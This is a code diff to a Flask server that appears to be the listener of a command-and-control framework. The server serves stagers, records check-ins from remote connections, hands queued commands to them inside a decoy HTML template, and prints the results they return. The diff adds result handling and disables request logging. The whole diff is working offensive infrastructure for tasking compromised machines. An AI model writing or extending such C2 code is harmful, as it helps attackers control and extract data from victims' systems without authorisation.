@@ -28,17 +28,22 @@ def serve_stagers(format_id):
 
 @app.route(f'{checkin_uri}', methods=['POST'])
 def checkin():
-    color.verbose(f'Post request made to {checkin_uri}')
     post_data = dict(request.get_json(force=True)) #figure it out force=true
+    color.verbose(f'{post_data} made to {checkin_uri} ')
     template = render_template('connection_template.html', random_data=util.random_data)
     try:
         connection = engine.retrieve_connection(post_data['connection_id'])
     except:
         return template
+    internet_addr = connection.system_information['ip']
+    if 'results' in post_data.keys():
+        color.normal('\n')
+        color.information(f'results recieved ({internet_addr})')
+        color.normal(post_data['results'])
     if connection.command_queue:
         template = render_template('connection_template.html', random_data=util.random_data, command=connection.command_queue.pop(0))
     if connection.status != 'connected':
-        internet_addr = connection.system_information['ip']
+        connection.status = 'connected'
         color.success(f'Successful connection ({internet_addr})')
     connection.check_in()
     return template
@@ -47,9 +52,6 @@ def run(ip, port):
     os.environ['WERKZEUG_RUN_MAIN'] = 'true'
     log = logging.getLogger('werkzeug')
     log.disabled = True
-    if not engine:
-        color.verbose('Please assign an engine to the server.')
-        return
     try:
         app.run(host=ip, port=port)
     except:
